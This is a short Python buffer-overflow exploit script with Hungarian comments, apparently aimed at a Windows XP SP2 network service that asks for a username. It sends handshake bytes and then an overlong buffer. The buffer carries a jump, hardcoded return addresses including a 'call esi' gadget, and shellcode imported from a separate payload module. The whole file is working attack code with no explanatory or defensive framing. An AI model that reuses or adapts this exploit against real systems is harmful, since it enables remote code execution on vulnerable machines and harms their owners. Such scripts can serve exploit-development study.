#!/usr/bin/python
import socket
from payload import buf
import time
import struct
def shell_attack(target_machine, target_port):
    init1 = (
    b"\x00\x00\x00\x00" # kezdeti handshake
    )
    init2 = (
    b"\x0d\x06\xfe" # Enter username uzenet koveti (NTdialog)
    )
    init3 = (
    b"A" * 100 #+ "\r" #username
    )
    readable_xp_sp2 = struct.pack(b'<L',0x023E5AD0)
    call_esi = struct.pack(b'<L',0x67f7aac4)
    jmp = struct.pack(b'<L',0x414112EB)

    init4 = (
    b"B" * 1282 + jmp + readable_xp_sp2 + b"DDDD" +call_esi + b"AAAA" + buf+ b"E" * (4000 - 1286 - 12 - len(buf))
    )

    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect((target_machine,target_port)) # hardcoded IP address

    
    s.send(init1) # send the data
    time.sleep(5)
    s.recv(1024)

   
    s.send(init2) # send the data
    time.sleep(5)
    s.recv(1024)

    s.send(init3) # send the data
    time.sleep(5)
    s.recv(1024)

   
    s.send(init4) # send the data
    s.close()